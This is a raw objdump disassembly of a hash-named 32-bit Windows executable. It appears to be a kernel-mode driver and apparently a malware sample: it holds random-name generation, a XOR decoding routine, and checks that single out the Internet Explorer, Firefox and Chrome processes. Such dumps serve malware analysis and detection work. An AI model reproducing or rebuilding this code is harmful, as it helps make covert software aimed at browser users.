
58b73db48af6d1e46034cae3e4231eca18b490e0400d41c5611c700669cd5fe3.exe:     file format pei-i386


Disassembly of section .text:

00010600 <.text>:
   10600:	add    BYTE PTR [eax],al
   10602:	add    BYTE PTR [eax],al
   10604:	add    BYTE PTR [eax],al
   10606:	mov    edi,edi
   10608:	push   ebp
   10609:	mov    ebp,esp
   1060b:	mov    eax,DWORD PTR [ebp+0xc]
   1060e:	xor    eax,DWORD PTR [ebp+0x10]
   10611:	and    eax,0x7ffffffe
   10616:	xor    eax,DWORD PTR [ebp+0xc]
   10619:	shr    eax,1
   1061b:	xor    eax,DWORD PTR [ebp+0x8]
   1061e:	mov    DWORD PTR [ebp+0xc],eax
   10621:	xor    DWORD PTR [ebp+0xc],0x5
   10625:	xor    DWORD PTR [ebp+0xc],0x1
   10629:	xor    DWORD PTR [ebp+0xc],0x4
   1062d:	mov    eax,DWORD PTR [ebp+0x10]
   10630:	and    al,0x1
   10632:	movzx  ecx,al
   10635:	mov    eax,DWORD PTR [ebp+0xc]
   10638:	neg    ecx
   1063a:	sbb    ecx,ecx
   1063c:	and    ecx,0x9908b0df
   10642:	xor    eax,ecx
   10644:	pop    ebp
   10645:	ret    0xc
   10648:	int3   
   10649:	int3   
   1064a:	int3   
   1064b:	int3   
   1064c:	int3   
   1064d:	int3   
   1064e:	mov    edi,edi
   10650:	push   ebp
   10651:	mov    ebp,esp
   10653:	sub    esp,0x14
   10656:	mov    DWORD PTR [ebp-0x14],ecx
   10659:	mov    eax,DWORD PTR [ebp-0x14]
   1065c:	mov    DWORD PTR [ebp-0x8],eax
   1065f:	mov    eax,DWORD PTR [ebp-0x14]
   10662:	mov    DWORD PTR [ebp-0x10],eax
   10665:	mov    DWORD PTR [ebp-0x4],0x1
   1066c:	mov    DWORD PTR [ebp-0xc],0x509
   10673:	mov    eax,DWORD PTR [ebp-0x8]
   10676:	mov    ecx,DWORD PTR [ebp+0x8]
   10679:	mov    DWORD PTR [eax],ecx
   1067b:	mov    eax,DWORD PTR [ebp-0x8]
   1067e:	add    eax,0x4
   10681:	mov    DWORD PTR [ebp-0x8],eax
   10684:	jmp    0x1068d
   10686:	mov    eax,DWORD PTR [ebp-0x4]
   10689:	inc    eax
   1068a:	mov    DWORD PTR [ebp-0x4],eax
   1068d:	cmp    DWORD PTR [ebp-0x4],0x270
   10694:	jge    0x106c9
   10696:	mov    eax,DWORD PTR [ebp-0x10]
   10699:	mov    eax,DWORD PTR [eax]
   1069b:	shr    eax,0x1e
   1069e:	mov    ecx,DWORD PTR [ebp-0x10]
   106a1:	xor    eax,DWORD PTR [ecx]
   106a3:	imul   eax,eax,0x15747d
   106a9:	imul   eax,DWORD PTR [ebp-0xc]
   106ad:	add    eax,DWORD PTR [ebp-0x4]
   106b0:	mov    ecx,DWORD PTR [ebp-0x8]
   106b3:	mov    DWORD PTR [ecx],eax
   106b5:	mov    eax,DWORD PTR [ebp-0x8]
   106b8:	add    eax,0x4
   106bb:	mov    DWORD PTR [ebp-0x8],eax
   106be:	mov    eax,DWORD PTR [ebp-0x10]
   106c1:	add    eax,0x4
   106c4:	mov    DWORD PTR [ebp-0x10],eax
   106c7:	jmp    0x10686
   106c9:	leave  
   106ca:	ret    0x4
   106cd:	int3   
   106ce:	int3   
   106cf:	int3   
   106d0:	int3   
   106d1:	int3   
   106d2:	mov    edi,edi
   106d4:	push   ebp
   106d5:	mov    ebp,esp
   106d7:	push   ecx
   106d8:	push   ebx
   106d9:	push   esi
   106da:	push   edi
   106db:	mov    edi,ecx
   106dd:	mov    esi,edi
   106df:	mov    ebx,0xe3
   106e4:	push   DWORD PTR [esi+0x4]
   106e7:	mov    ecx,edi
   106e9:	push   DWORD PTR [esi]
   106eb:	dec    ebx
   106ec:	push   DWORD PTR [esi+0x634]
   106f2:	call   0x10606
   106f7:	mov    DWORD PTR [esi],eax
   106f9:	add    esi,0x4
   106fc:	test   ebx,ebx
   106fe:	jne    0x106e4
   10700:	mov    DWORD PTR [ebp-0x4],0x18c
   10707:	lea    ebx,[esi+0x4]
   1070a:	push   DWORD PTR [ebx]
   1070c:	mov    ecx,edi
   1070e:	push   DWORD PTR [esi]
   10710:	push   DWORD PTR [esi-0x38c]
   10716:	call   0x10606
   1071b:	dec    DWORD PTR [ebp-0x4]
   1071e:	mov    DWORD PTR [esi],eax
   10720:	mov    esi,ebx
   10722:	jne    0x10707
   10724:	push   DWORD PTR [edi]
   10726:	mov    ecx,edi
   10728:	push   DWORD PTR [esi]
   1072a:	push   DWORD PTR [esi-0x38c]
   10730:	call   0x10606
   10735:	mov    DWORD PTR [esi],eax
   10737:	mov    DWORD PTR [edi+0x9c4],0x270
   10741:	mov    DWORD PTR [edi+0x9c0],edi
   10747:	pop    edi
   10748:	pop    esi
   10749:	pop    ebx
   1074a:	leave  
   1074b:	ret    
   1074c:	int3   
   1074d:	int3   
   1074e:	int3   
   1074f:	int3   
   10750:	int3   
   10751:	int3   
   10752:	mov    edi,edi
   10754:	push   ebp
   10755:	mov    ebp,esp
   10757:	push   esi
   10758:	push   DWORD PTR [ebp+0x8]
   1075b:	mov    esi,ecx
   1075d:	call   0x1064e
   10762:	mov    ecx,esi
   10764:	call   0x106d2
   10769:	pop    esi
   1076a:	pop    ebp
   1076b:	ret    0x4
   1076e:	int3   
   1076f:	int3   
   10770:	int3   
   10771:	int3   
   10772:	int3   
   10773:	int3   
   10774:	mov    edi,edi
   10776:	push   esi
   10777:	push   edi
   10778:	mov    edi,ecx
   1077a:	lea    esi,[edi+0x9c4]
   10780:	cmp    DWORD PTR [esi],0x0
   10783:	jne    0x1078a
   10785:	call   0x106d2
   1078a:	dec    DWORD PTR [esi]
   1078c:	lea    eax,[edi+0x9c0]
   10792:	mov    edx,DWORD PTR [eax]
   10794:	mov    ecx,DWORD PTR [edx]
   10796:	add    edx,0x4
   10799:	mov    DWORD PTR [eax],edx
   1079b:	mov    eax,ecx
   1079d:	shr    eax,0xb
   107a0:	xor    ecx,eax
   107a2:	mov    eax,ecx
   107a4:	and    eax,0xff3a58ad
   107a9:	shl    eax,0x7
   107ac:	xor    ecx,eax
   107ae:	mov    eax,ecx
   107b0:	and    eax,0xffffdf8c
   107b5:	shl    eax,0xf
   107b8:	xor    ecx,eax
   107ba:	mov    eax,ecx
   107bc:	shr    eax,0x12
   107bf:	pop    edi
   107c0:	xor    eax,ecx
   107c2:	pop    esi
   107c3:	ret    
   107c4:	int3   
   107c5:	int3   
   107c6:	int3   
   107c7:	int3   
   107c8:	int3   
   107c9:	int3   
   107ca:	mov    edi,edi
   107cc:	push   ebp
   107cd:	mov    ebp,esp
   107cf:	push   esi
   107d0:	mov    esi,DWORD PTR [ebp+0x8]
   107d3:	shr    esi,1
   107d5:	or     esi,DWORD PTR [ebp+0x8]
   107d8:	push   edi
   107d9:	mov    eax,esi
   107db:	shr    eax,0x2
   107de:	or     esi,eax
   107e0:	mov    eax,esi
   107e2:	shr    eax,0x4
   107e5:	or     esi,eax
   107e7:	mov    eax,esi
   107e9:	shr    eax,0x8
   107ec:	or     esi,eax
   107ee:	mov    eax,esi
   107f0:	shr    eax,0x10
   107f3:	mov    edi,ecx
   107f5:	or     esi,eax
   107f7:	mov    ecx,edi
   107f9:	call   0x10774
   107fe:	and    eax,esi
   10800:	cmp    eax,DWORD PTR [ebp+0x8]
   10803:	ja     0x107f7
   10805:	pop    edi
   10806:	pop    esi
   10807:	pop    ebp
   10808:	ret    0x4
   1080b:	int3   
   1080c:	int3   
   1080d:	int3   
   1080e:	int3   
   1080f:	int3   
   10810:	mov    edi,edi
   10812:	push   ebp
   10813:	mov    ebp,esp
   10815:	sub    esp,0xa04
   1081b:	push   ebx
   1081c:	push   esi
   1081d:	mov    esi,DWORD PTR [ebp+0x14]
   10820:	push   edi
   10821:	test   esi,esi
   10823:	jne    0x108fe
   10829:	xor    ecx,ecx
   1082b:	lea    eax,[ebp-0x3c]
   1082e:	mov    edx,0xff
   10833:	shl    edx,cl
   10835:	and    edx,DWORD PTR [ebp+0x8]
   10838:	shr    edx,cl
   1083a:	inc    ecx
   1083b:	inc    ecx
   1083c:	mov    DWORD PTR [eax],edx
   1083e:	add    eax,0x4
   10841:	cmp    ecx,0x14
   10844:	jne    0x1082e
   10846:	mov    ebx,DWORD PTR [ebp+0xc]
   10849:	xor    eax,eax
   1084b:	mov    WORD PTR [ebx],ax
   1084e:	mov    eax,DWORD PTR [ebp-0x3c]
   10851:	push   0x5
   10853:	cdq    
   10854:	pop    ecx
   10855:	idiv   ecx
   10857:	mov    DWORD PTR [ebp-0x14],0x1de76
   1085e:	mov    DWORD PTR [ebp-0x10],0x1de6c
   10865:	mov    DWORD PTR [ebp-0xc],0x1de64
   1086c:	mov    DWORD PTR [ebp-0x8],0x1de5a
   10873:	mov    DWORD PTR [ebp-0x4],0x1de50
   1087a:	mov    edx,DWORD PTR [ebp+edx*4-0x14]
   1087e:	mov    ecx,edx
   10880:	mov    ax,WORD PTR [edx]
   10883:	inc    edx
   10884:	inc    edx
   10885:	test   ax,ax
   10888:	jne    0x10880
   1088a:	sub    edx,ecx
   1088c:	mov    edi,ebx
   1088e:	dec    edi
   1088f:	mov    esi,ecx
   10891:	dec    edi
   10892:	mov    ax,WORD PTR [edi+0x2]
   10896:	inc    edi
   10897:	inc    edi
   10898:	test   ax,ax
   1089b:	jne    0x10892
   1089d:	mov    ecx,edx
   1089f:	shr    ecx,0x2
   108a2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   108a4:	mov    ecx,edx
   108a6:	and    ecx,0x3
   108a9:	mov    eax,ebx
   108ab:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   108ad:	lea    ecx,[eax+0x2]
   108b0:	mov    dx,WORD PTR [eax]
   108b3:	inc    eax
   108b4:	inc    eax
   108b5:	test   dx,dx
   108b8:	jne    0x108b0
   108ba:	sub    eax,ecx
   108bc:	sar    eax,1
   108be:	mov    ecx,eax
   108c0:	mov    eax,DWORD PTR [ebp-0x38]
   108c3:	push   0x3
   108c5:	cdq    
   108c6:	pop    esi
   108c7:	idiv   esi
   108c9:	cmp    edx,0xfffffffe
   108cc:	jle    0x109b3
   108d2:	add    edx,0x2
   108d5:	lea    esi,[ebp-0x34]
   108d8:	mov    DWORD PTR [ebp+0x8],edx
   108db:	mov    eax,DWORD PTR [esi]
   108dd:	cdq    
   108de:	push   0x1a
   108e0:	pop    edi
   108e1:	idiv   edi
   108e3:	add    esi,0x4
   108e6:	xor    eax,eax
   108e8:	add    edx,0x61
   108eb:	mov    WORD PTR [ebx+ecx*2],dx
   108ef:	inc    ecx
   108f0:	dec    DWORD PTR [ebp+0x8]
   108f3:	mov    WORD PTR [ebx+ecx*2],ax
   108f7:	jne    0x108db
   108f9:	jmp    0x109b3
   108fe:	cmp    esi,0x1
   10901:	je     0x1090e
   10903:	mov    eax,esi
   10905:	imul   eax,eax,0xa
   10908:	add    eax,DWORD PTR [ebp+0x10]
   1090b:	add    DWORD PTR [ebp+0x8],eax
   1090e:	push   DWORD PTR [ebp+0x8]
   10911:	lea    ecx,[ebp-0xa04]
   10917:	call   0x10752
   1091c:	lea    eax,[esi-0x1]
   1091f:	cmp    eax,0x6
   10922:	ja     0x10933
   10924:	imul   esi,esi,0x3
   10927:	add    esi,DWORD PTR [ebp+0x10]
   1092a:	mov    esi,DWORD PTR [esi*4+0x7eabc]
   10931:	jmp    0x10938
   10933:	mov    esi,0x1de4e
   10938:	mov    ebx,DWORD PTR [ebp+0xc]
   1093b:	xor    eax,eax
   1093d:	mov    WORD PTR [ebx],ax
   10940:	mov    eax,esi
   10942:	mov    edx,esi
   10944:	mov    cx,WORD PTR [eax]
   10947:	inc    eax
   10948:	inc    eax
   10949:	test   cx,cx
   1094c:	jne    0x10944
   1094e:	sub    eax,edx
   10950:	mov    edi,ebx
   10952:	dec    edi
   10953:	dec    edi
   10954:	mov    cx,WORD PTR [edi+0x2]
   10958:	inc    edi
   10959:	inc    edi
   1095a:	test   cx,cx
   1095d:	jne    0x10954
   1095f:	mov    ecx,eax
   10961:	shr    ecx,0x2
   10964:	mov    esi,edx
   10966:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10968:	mov    ecx,eax
   1096a:	and    ecx,0x3
   1096d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1096f:	nop
   10970:	mov    eax,ebx
   10972:	lea    ecx,[eax+0x2]
   10975:	mov    dx,WORD PTR [eax]
   10978:	inc    eax
   10979:	inc    eax
   1097a:	test   dx,dx
   1097d:	jne    0x10975
   1097f:	sub    eax,ecx
   10981:	sar    eax,1
   10983:	push   0x5
   10985:	mov    esi,eax
   10987:	pop    edi
   10988:	push   0x23
   1098a:	lea    ecx,[ebp-0xa04]
   10990:	call   0x107ca
   10995:	cmp    eax,0xa
   10998:	jae    0x1099f
   1099a:	add    eax,0x30
   1099d:	jmp    0x109a2
   1099f:	add    eax,0x57
   109a2:	movzx  eax,ax
   109a5:	mov    WORD PTR [ebx+esi*2],ax
   109a9:	inc    esi
   109aa:	xor    eax,eax
   109ac:	dec    edi
   109ad:	mov    WORD PTR [ebx+esi*2],ax
   109b1:	jne    0x10988
   109b3:	pop    edi
   109b4:	pop    esi
   109b5:	pop    ebx
   109b6:	leave  
   109b7:	ret    0x10
   109ba:	int3   
   109bb:	int3   
   109bc:	int3   
   109bd:	int3   
   109be:	int3   
   109bf:	int3   
   109c0:	mov    edi,edi
   109c2:	push   ebp
   109c3:	mov    ebp,esp
   109c5:	mov    eax,DWORD PTR [ebp+0x8]
   109c8:	lea    edx,[eax+0x2]
   109cb:	mov    cx,WORD PTR [eax]
   109ce:	inc    eax
   109cf:	inc    eax
   109d0:	test   cx,cx
   109d3:	jne    0x109cb
   109d5:	sub    eax,edx
   109d7:	sar    eax,1
   109d9:	pop    ebp
   109da:	ret    0x4
   109dd:	int3   
   109de:	int3   
   109df:	int3   
   109e0:	int3   
   109e1:	int3   
   109e2:	mov    eax,ecx
   109e4:	ret    
   109e5:	int3   
   109e6:	int3   
   109e7:	int3   
   109e8:	int3   
   109e9:	int3   
   109ea:	ret    
   109eb:	int3   
   109ec:	int3   
   109ed:	int3   
   109ee:	int3   
   109ef:	int3   
   109f0:	mov    edi,edi
   109f2:	push   ebp
   109f3:	mov    ebp,esp
   109f5:	push   esi
   109f6:	mov    esi,DWORD PTR [ebp+0x8]
   109f9:	push   edi
   109fa:	mov    edi,DWORD PTR [ebp+0xc]
   109fd:	jmp    0x10a4d
   109ff:	push   0x0
   10a01:	push   0x100
   10a06:	push   edi
   10a07:	push   esi
   10a08:	call   0x1da94
   10a0d:	lea    eax,[eax*8+0x7eec8]
   10a14:	add    DWORD PTR [eax],esi
   10a16:	adc    DWORD PTR [eax+0x4],edi
   10a19:	test   edi,edi
   10a1b:	jl     0x10a56
   10a1d:	jg     0x10a23
   10a1f:	test   esi,esi
   10a21:	jbe    0x10a56
   10a23:	mov    eax,esi
   10a25:	xor    ecx,ecx
   10a27:	and    eax,0x1
   10a2a:	or     eax,ecx
   10a2c:	push   ecx
   10a2d:	jne    0x10a3a
   10a2f:	push   0x2
   10a31:	push   edi
   10a32:	push   esi
   10a33:	call   0x1da88
   10a38:	jmp    0x10a49
   10a3a:	push   0x3
   10a3c:	push   edi
   10a3d:	push   esi
   10a3e:	call   0x1da7c
   10a43:	add    eax,0x1
   10a46:	adc    edx,0x0
   10a49:	mov    edi,edx
   10a4b:	mov    esi,eax
   10a4d:	cmp    esi,0x4
   10a50:	jne    0x109ff
   10a52:	test   edi,edi
   10a54:	jne    0x109ff
   10a56:	mov    edx,edi
   10a58:	pop    edi
   10a59:	mov    eax,esi
   10a5b:	pop    esi
   10a5c:	pop    ebp
   10a5d:	ret    0x8
   10a60:	int3   
   10a61:	int3   
   10a62:	int3   
   10a63:	int3   
   10a64:	int3   
   10a65:	int3   
   10a66:	mov    edi,edi
   10a68:	push   ebp
   10a69:	mov    ebp,esp
   10a6b:	push   esi
   10a6c:	push   0x20
   10a6e:	push   0x61737973
   10a73:	push   DWORD PTR [ebp+0x8]
   10a76:	push   0x1
   10a78:	call   DWORD PTR ds:0x1ee18
   10a7e:	mov    esi,eax
   10a80:	test   esi,esi
   10a82:	jne    0x10a8f
   10a84:	push   0xc000009a
   10a89:	call   DWORD PTR ds:0x1ee14
   10a8f:	mov    eax,esi
   10a91:	pop    esi
   10a92:	pop    ebp
   10a93:	ret    
   10a94:	int3   
   10a95:	int3   
   10a96:	int3   
   10a97:	int3   
   10a98:	int3   
   10a99:	int3   
   10a9a:	mov    edi,edi
   10a9c:	push   ebp
   10a9d:	mov    ebp,esp
   10a9f:	cmp    DWORD PTR [ebp+0x8],0x0
   10aa3:	je     0x10ab0
   10aa5:	push   0x0
   10aa7:	push   DWORD PTR [ebp+0x8]
   10aaa:	call   DWORD PTR ds:0x1ee1c
   10ab0:	pop    ebp
   10ab1:	ret    
   10ab2:	int3   
   10ab3:	int3   
   10ab4:	int3   
   10ab5:	int3   
   10ab6:	int3   
   10ab7:	int3   
   10ab8:	mov    edi,edi
   10aba:	push   esi
   10abb:	mov    esi,ecx
   10abd:	dec    DWORD PTR [esi+0x4]
   10ac0:	jne    0x10ad1
   10ac2:	push   DWORD PTR [esi]
   10ac4:	call   0x10a9a
   10ac9:	push   esi
   10aca:	call   0x10a9a
   10acf:	pop    ecx
   10ad0:	pop    ecx
   10ad1:	pop    esi
   10ad2:	ret    
   10ad3:	int3   
   10ad4:	int3   
   10ad5:	int3   
   10ad6:	int3   
   10ad7:	int3   
   10ad8:	mov    edi,edi
   10ada:	push   ebp
   10adb:	mov    ebp,esp
   10add:	push   esi
   10ade:	xor    esi,esi
   10ae0:	xor    edx,edx
   10ae2:	cmp    DWORD PTR [ebp+0xc],esi
   10ae5:	je     0x10b02
   10ae7:	mov    eax,DWORD PTR [ebp+0x8]
   10aea:	mov    ecx,DWORD PTR [ebp+0x10]
   10aed:	mov    cl,BYTE PTR [edx+ecx*1]
   10af0:	add    eax,esi
   10af2:	xor    BYTE PTR [eax],cl
   10af4:	lea    eax,[edx+0x1]
   10af7:	xor    edx,edx
   10af9:	div    DWORD PTR [ebp+0x14]
   10afc:	inc    esi
   10afd:	cmp    esi,DWORD PTR [ebp+0xc]
   10b00:	jne    0x10ae7
   10b02:	pop    esi
   10b03:	pop    ebp
   10b04:	ret    0x10
   10b07:	int3   
   10b08:	int3   
   10b09:	int3   
   10b0a:	int3   
   10b0b:	int3   
   10b0c:	mov    edi,edi
   10b0e:	push   ebp
   10b0f:	mov    ebp,esp
   10b11:	mov    ecx,DWORD PTR [ebp+0x8]
   10b14:	mov    eax,ecx
   10b16:	lea    edx,[eax+0x2]
   10b19:	push   esi
   10b1a:	mov    si,WORD PTR [eax]
   10b1d:	inc    eax
   10b1e:	inc    eax
   10b1f:	test   si,si
   10b22:	jne    0x10b1a
   10b24:	sub    eax,edx
   10b26:	sar    eax,1
   10b28:	cmp    eax,0xc
   10b2b:	jae    0x10b34
   10b2d:	xor    al,al
   10b2f:	jmp    0x10c02
   10b34:	lea    eax,[ecx+eax*2-0x18]
   10b38:	movzx  ecx,WORD PTR [eax]
   10b3b:	cmp    cx,0x69
   10b3f:	je     0x10b47
   10b41:	cmp    cx,0x49
   10b45:	jne    0x10b2d
   10b47:	movzx  ecx,WORD PTR [eax+0x2]
   10b4b:	push   0x45
   10b4d:	pop    esi
   10b4e:	push   0x65
   10b50:	pop    edx
   10b51:	cmp    cx,dx
   10b54:	je     0x10b5b
   10b56:	cmp    cx,si
   10b59:	jne    0x10b2d
   10b5b:	movzx  ecx,WORD PTR [eax+0x4]
   10b5f:	cmp    cx,0x78
   10b63:	je     0x10b6b
   10b65:	cmp    cx,0x58
   10b69:	jne    0x10b2d
   10b6b:	movzx  ecx,WORD PTR [eax+0x6]
   10b6f:	cmp    cx,0x70
   10b73:	je     0x10b7b
   10b75:	cmp    cx,0x50
   10b79:	jne    0x10b2d
   10b7b:	movzx  ecx,WORD PTR [eax+0x8]
   10b7f:	cmp    cx,0x6c
   10b83:	je     0x10b8b
   10b85:	cmp    cx,0x4c
   10b89:	jne    0x10b2d
   10b8b:	movzx  ecx,WORD PTR [eax+0xa]
   10b8f:	cmp    cx,0x6f
   10b93:	je     0x10b9b
   10b95:	cmp    cx,0x4f
   10b99:	jne    0x10b2d
   10b9b:	movzx  ecx,WORD PTR [eax+0xc]
   10b9f:	cmp    cx,0x52
   10ba3:	je     0x10bab
   10ba5:	cmp    cx,0x72
   10ba9:	jne    0x10b2d
   10bab:	movzx  ecx,WORD PTR [eax+0xe]
   10baf:	cmp    cx,dx
   10bb2:	je     0x10bbd
   10bb4:	cmp    cx,si
   10bb7:	jne    0x10b2d
   10bbd:	cmp    WORD PTR [eax+0x10],0x2e
   10bc2:	jne    0x10b2d
   10bc8:	movzx  ecx,WORD PTR [eax+0x12]
   10bcc:	cmp    cx,dx
   10bcf:	je     0x10bda
   10bd1:	cmp    cx,si
   10bd4:	jne    0x10b2d
   10bda:	movzx  ecx,WORD PTR [eax+0x14]
   10bde:	cmp    cx,0x78
   10be2:	je     0x10bee
   10be4:	cmp    cx,0x58
   10be8:	jne    0x10b2d
   10bee:	movzx  eax,WORD PTR [eax+0x16]
   10bf2:	cmp    ax,dx
   10bf5:	je     0x10c00
   10bf7:	cmp    ax,si
   10bfa:	jne    0x10b2d
   10c00:	mov    al,0x1
   10c02:	pop    esi
   10c03:	pop    ebp
   10c04:	ret    0x4
   10c07:	int3   
   10c08:	int3   
   10c09:	int3   
   10c0a:	int3   
   10c0b:	int3   
   10c0c:	mov    edi,edi
   10c0e:	push   ebp
   10c0f:	mov    ebp,esp
   10c11:	mov    ecx,DWORD PTR [ebp+0x8]
   10c14:	mov    eax,ecx
   10c16:	lea    edx,[eax+0x2]
   10c19:	push   esi
   10c1a:	mov    si,WORD PTR [eax]
   10c1d:	inc    eax
   10c1e:	inc    eax
   10c1f:	test   si,si
   10c22:	jne    0x10c1a
   10c24:	sub    eax,edx
   10c26:	sar    eax,1
   10c28:	pop    esi
   10c29:	cmp    eax,0xb
   10c2c:	jae    0x10c35
   10c2e:	xor    al,al
   10c30:	jmp    0x10cf1
   10c35:	lea    eax,[ecx+eax*2-0x16]
   10c39:	movzx  ecx,WORD PTR [eax]
   10c3c:	cmp    cx,0x66
   10c40:	je     0x10c48
   10c42:	cmp    cx,0x46
   10c46:	jne    0x10c2e
   10c48:	movzx  ecx,WORD PTR [eax+0x2]
   10c4c:	cmp    cx,0x69
   10c50:	je     0x10c58
   10c52:	cmp    cx,0x49
   10c56:	jne    0x10c2e
   10c58:	movzx  ecx,WORD PTR [eax+0x4]
   10c5c:	cmp    cx,0x72
   10c60:	je     0x10c68
   10c62:	cmp    cx,0x52
   10c66:	jne    0x10c2e
   10c68:	movzx  ecx,WORD PTR [eax+0x6]
   10c6c:	cmp    cx,0x65
   10c70:	je     0x10c78
   10c72:	cmp    cx,0x45
   10c76:	jne    0x10c2e
   10c78:	movzx  ecx,WORD PTR [eax+0x8]
   10c7c:	cmp    cx,0x66
   10c80:	je     0x10c88
   10c82:	cmp    cx,0x46
   10c86:	jne    0x10c2e
   10c88:	movzx  ecx,WORD PTR [eax+0xa]
   10c8c:	cmp    cx,0x6f
   10c90:	je     0x10c98
   10c92:	cmp    cx,0x4f
   10c96:	jne    0x10c2e
   10c98:	movzx  ecx,WORD PTR [eax+0xc]
   10c9c:	cmp    cx,0x58
   10ca0:	je     0x10ca8
   10ca2:	cmp    cx,0x78
   10ca6:	jne    0x10c2e
   10ca8:	cmp    WORD PTR [eax+0xe],0x2e
   10cad:	jne    0x10c2e
   10cb3:	movzx  ecx,WORD PTR [eax+0x10]
   10cb7:	cmp    cx,0x65
   10cbb:	je     0x10cc7
   10cbd:	cmp    cx,0x45
   10cc1:	jne    0x10c2e
   10cc7:	movzx  ecx,WORD PTR [eax+0x12]
   10ccb:	cmp    cx,0x78
   10ccf:	je     0x10cdb
   10cd1:	cmp    cx,0x58
   10cd5:	jne    0x10c2e
   10cdb:	movzx  eax,WORD PTR [eax+0x14]
   10cdf:	cmp    ax,0x65
   10ce3:	je     0x10cef
   10ce5:	cmp    ax,0x45
   10ce9:	jne    0x10c2e
   10cef:	mov    al,0x1
   10cf1:	pop    ebp
   10cf2:	ret    0x4
   10cf5:	int3   
   10cf6:	int3   
   10cf7:	int3   
   10cf8:	int3   
   10cf9:	int3   
   10cfa:	mov    edi,edi
   10cfc:	push   ebp
   10cfd:	mov    ebp,esp
   10cff:	mov    ecx,DWORD PTR [ebp+0x8]
   10d02:	mov    eax,ecx
   10d04:	lea    edx,[eax+0x2]
   10d07:	push   esi
   10d08:	mov    si,WORD PTR [eax]
   10d0b:	inc    eax
   10d0c:	inc    eax
   10d0d:	test   si,si
   10d10:	jne    0x10d08
   10d12:	sub    eax,edx
   10d14:	sar    eax,1
   10d16:	pop    esi
   10d17:	cmp    eax,0xa
   10d1a:	jae    0x10d23
   10d1c:	xor    al,al
   10d1e:	jmp    0x10dcb
   10d23:	lea    eax,[ecx+eax*2-0x14]
   10d27:	movzx  ecx,WORD PTR [eax]
   10d2a:	cmp    cx,0x63
   10d2e:	je     0x10d36
   10d30:	cmp    cx,0x43
   10d34:	jne    0x10d1c
   10d36:	movzx  ecx,WORD PTR [eax+0x2]
   10d3a:	cmp    cx,0x68
   10d3e:	je     0x10d46
   10d40:	cmp    cx,0x48
   10d44:	jne    0x10d1c
   10d46:	movzx  ecx,WORD PTR [eax+0x4]
   10d4a:	cmp    cx,0x72
   10d4e:	je     0x10d56
   10d50:	cmp    cx,0x52
   10d54:	jne    0x10d1c
   10d56:	movzx  ecx,WORD PTR [eax+0x6]
   10d5a:	cmp    cx,0x6f
   10d5e:	je     0x10d66
   10d60:	cmp    cx,0x4f
   10d64:	jne    0x10d1c
   10d66:	movzx  ecx,WORD PTR [eax+0x8]
   10d6a:	cmp    cx,0x6d
   10d6e:	je     0x10d76
   10d70:	cmp    cx,0x4d
   10d74:	jne    0x10d1c
   10d76:	movzx  ecx,WORD PTR [eax+0xa]
   10d7a:	cmp    cx,0x65
   10d7e:	je     0x10d86
   10d80:	cmp    cx,0x45
   10d84:	jne    0x10d1c
   10d86:	cmp    WORD PTR [eax+0xc],0x2e
   10d8b:	jne    0x10d1c
   10d8d:	movzx  ecx,WORD PTR [eax+0xe]
   10d91:	cmp    cx,0x65
   10d95:	je     0x10da1
   10d97:	cmp    cx,0x45
   10d9b:	jne    0x10d1c
   10da1:	movzx  ecx,WORD PTR [eax+0x10]
   10da5:	cmp    cx,0x78
   10da9:	je     0x10db5
   10dab:	cmp    cx,0x58
   10daf:	jne    0x10d1c
   10db5:	movzx  eax,WORD PTR [eax+0x12]
   10db9:	cmp    ax,0x65
   10dbd:	je     0x10dc9
   10dbf:	cmp    ax,0x45
   10dc3:	jne    0x10d1c
   10dc9:	mov    al,0x1
   10dcb:	pop    ebp
   10dcc:	ret    0x4
   10dcf:	int3   
   10dd0:	int3   
   10dd1:	int3   
   10dd2:	int3   
   10dd3:	int3   
   10dd4:	mov    edi,edi
   10dd6:	push   ebp
   10dd7:	mov    ebp,esp
   10dd9:	push   DWORD PTR [ebp+0x8]
   10ddc:	call   0x10b0c
   10de1:	test   al,al
   10de3:	je     0x10dea
   10de5:	xor    eax,eax
   10de7:	inc    eax
   10de8:	jmp    0x10e0d
   10dea:	push   DWORD PTR [ebp+0x8]
   10ded:	call   0x10c0c
   10df2:	test   al,al
   10df4:	je     0x10dfb
   10df6:	push   0x2
   10df8:	pop    eax
   10df9:	jmp    0x10e0d
   10dfb:	push   DWORD PTR [ebp+0x8]
   10dfe:	call   0x10cfa
   10e03:	movzx  eax,al
   10e06:	neg    eax
   10e08:	sbb    eax,eax
   10e0a:	and    eax,0x3
   10e0d:	pop    ebp
   10e0e:	ret    0x4
   10e11:	int3   
   10e12:	int3   
   10e13:	int3   
   10e14:	int3   
   10e15:	int3   
   10e16:	mov    edi,edi
   10e18:	push   ebp
   10e19:	mov    ebp,esp
   10e1b:	sub    esp,0x10
   10e1e:	push   esi
   10e1f:	push   edi
   10e20:	xor    eax,eax
   10e22:	mov    WORD PTR [ebp-0x8],ax
   10e26:	lea    edi,[ebp-0x6]
   10e29:	stos   DWORD PTR es:[edi],eax
   10e2a:	stos   WORD PTR es:[edi],ax
   10e2c:	mov    eax,DWORD PTR [ebp+0xc]
   10e2f:	mov    DWORD PTR [ebp-0x4],eax
   10e32:	lea    ecx,[eax+0x2]
   10e35:	mov    dx,WORD PTR [eax]
   10e38:	inc    eax
   10e39:	inc    eax
   10e3a:	test   dx,dx
   10e3d:	jne    0x10e35
   10e3f:	mov    esi,DWORD PTR [ebp+0x8]
   10e42:	movzx  edx,WORD PTR [esi]
   10e45:	sub    eax,ecx
   10e47:	sar    eax,1
   10e49:	lea    ecx,[eax+eax*1]
   10e4c:	mov    WORD PTR [ebp-0x8],cx
   10e50:	mov    WORD PTR [ebp-0x6],cx
   10e54:	cmp    dx,cx
   10e57:	jb     0x10e96
   10e59:	xor    eax,eax
   10e5b:	lea    edi,[ebp-0xe]
   10e5e:	stos   DWORD PTR es:[edi],eax
   10e5f:	stos   WORD PTR es:[edi],ax
   10e61:	mov    WORD PTR [ebp-0x10],cx
   10e65:	mov    WORD PTR [ebp-0xe],cx
   10e69:	movzx  eax,dx
   10e6c:	movzx  ecx,cx
   10e6f:	sub    eax,ecx
   10e71:	mov    ecx,DWORD PTR [esi+0x4]
   10e74:	cdq    
   10e75:	sub    eax,edx
   10e77:	sar    eax,1
   10e79:	lea    eax,[ecx+eax*2]
   10e7c:	mov    DWORD PTR [ebp-0xc],eax
   10e7f:	push   0x1
